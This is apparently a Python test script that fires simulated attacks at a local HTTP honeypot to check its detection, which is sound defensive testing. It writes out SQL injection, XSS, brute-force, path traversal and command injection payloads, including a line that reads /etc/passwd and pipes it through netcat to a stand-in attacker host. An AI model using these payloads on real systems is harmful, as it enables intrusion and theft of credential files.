#!/usr/bin/env python3
"""
Script to simulate attacks on the honeypot for testing
"""

import socket
import time
import sys

def send_http_request(host, port, request_data):
    """Send HTTP request to honeypot"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.sendall(request_data.encode('utf-8'))
        response = sock.recv(4096)
        sock.close()
        print(f"✓ Request sent to {host}:{port}")
        return True
    except Exception as e:
        print(f"✗ Error: {e}")
        return False


def test_sql_injection(host, port):
    """Test SQL injection detection"""
    print("\n=== Testing SQL Injection ===")
    request = """POST /login HTTP/1.1\r
Host: {}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 60\r
\r
username=admin' OR '1'='1&password=test' UNION SELECT * FROM users--
""".format(f"{host}:{port}")
    send_http_request(host, port, request)
    time.sleep(1)


def test_xss_attack(host, port):
    """Test XSS detection"""
    print("\n=== Testing XSS Attack ===")
    request = """POST /login HTTP/1.1\r
Host: {}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 70\r
\r
username=test&password=<script>alert('xss')</script>
""".format(f"{host}:{port}")
    send_http_request(host, port, request)
    time.sleep(1)


def test_brute_force(host, port):
    """Test brute force detection"""
    print("\n=== Testing Brute Force Attack ===")
    weak_passwords = ["password", "123456", "admin", "12345"]
    for pwd in weak_passwords:
        request = f"""POST /login HTTP/1.1\r
Host: {host}:{port}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {len(f'username=admin&password={pwd}')}\r
\r
username=admin&password={pwd}
"""
        send_http_request(host, port, request)
        time.sleep(0.5)


def test_command_injection(host, port):
    """Test command injection detection"""
    print("\n=== Testing Command Injection ===")
    request = """POST /login HTTP/1.1\r
Host: {}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 50\r
\r
username=test&cmd=cat /etc/passwd | nc attacker.com
""".format(f"{host}:{port}")
    send_http_request(host, port, request)
    time.sleep(1)


def test_path_traversal(host, port):
    """Test path traversal detection"""
    print("\n=== Testing Path Traversal ===")
    request = """GET /../../etc/passwd HTTP/1.1\r
Host: {}\r
\r
""".format(f"{host}:{port}")
    send_http_request(host, port, request)
    time.sleep(1)


def test_normal_login(host, port):
    """Test normal login attempt (no attack)"""
    print("\n=== Testing Normal Login Attempt ===")
    request = """POST /login HTTP/1.1\r
Host: {}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 35\r
\r
username=user123&password=pass456
""".format(f"{host}:{port}")
    send_http_request(host, port, request)
    time.sleep(1)


def main():
    host = "localhost"
    port = 8080
    
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    
    print(f"🎯 Simulating attacks on HTTP Honeypot at {host}:{port}")
    print("=" * 50)
    
    # Run tests
    try:
        test_normal_login(host, port)
        test_sql_injection(host, port)
        test_xss_attack(host, port)
        test_brute_force(host, port)
        test_command_injection(host, port)
        test_path_traversal(host, port)
        
        print("\n" + "=" * 50)
        print("✓ All attack simulations completed!")
        print("Check the Activity Log in the web interface to see detected attacks.")
        
    except KeyboardInterrupt:
        print("\n⚠ Interrupted by user")
    except Exception as e:
        print(f"\n✗ Error during testing: {e}")


if __name__ == "__main__":
    main()
